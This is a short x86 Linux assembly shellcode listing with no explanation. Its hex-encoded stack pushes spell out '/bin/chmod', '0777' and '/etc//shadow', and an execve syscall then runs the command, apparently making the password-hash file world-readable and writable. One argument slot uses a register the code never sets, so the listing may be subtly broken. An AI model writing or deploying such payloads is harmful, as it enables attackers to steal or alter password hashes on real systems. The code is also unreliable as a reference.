global _start

section .text
_start:

	xor eax,eax
	push eax
	push 0x776f6461
	push 0x68732f2f
	push 0x6374652f
	push eax
	push 0x37373730
	mov ebp,esp
	push eax
	push 0x646f6d68
	push 0x632f6e69
	push word 0x622f
	mov ebx,esp
	push eax
	push esi
	push ebp
	push ebx
	mov ecx,esp
	mov edx,eax
	mov al,0xb
	int 0x80
